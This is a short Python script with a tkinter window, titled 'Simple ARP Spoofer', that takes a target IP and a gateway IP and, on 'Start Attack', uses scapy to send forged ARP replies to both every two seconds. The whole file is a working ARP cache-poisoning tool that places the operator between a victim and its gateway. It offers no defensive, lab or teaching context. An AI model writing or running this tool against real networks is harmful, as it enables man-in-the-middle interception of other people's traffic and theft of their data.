import tkinter as tk
from scapy.all import ARP, send
import threading
import time

running = False

def arp_spoof(target_ip, gateway_ip):
    global running
    while running:
        packet1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
        packet2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip)
        send(packet1, verbose=False)
        send(packet2, verbose=False)
        time.sleep(2)

def start_attack():
    global running
    running = True
    t = threading.Thread(target=arp_spoof, args=(target_entry.get(), gateway_entry.get()))
    t.start()

def stop_attack():
    global running
    running = False

app = tk.Tk()
app.title("Simple ARP Spoofer")

tk.Label(app, text="Target IP:").pack()
target_entry = tk.Entry(app)
target_entry.pack()

tk.Label(app, text="Gateway IP:").pack()
gateway_entry = tk.Entry(app)
gateway_entry.pack()

tk.Button(app, text="Start Attack", command=start_attack).pack(pady=5)
tk.Button(app, text="Stop Attack", command=stop_attack).pack(pady=5)

app.mainloop()
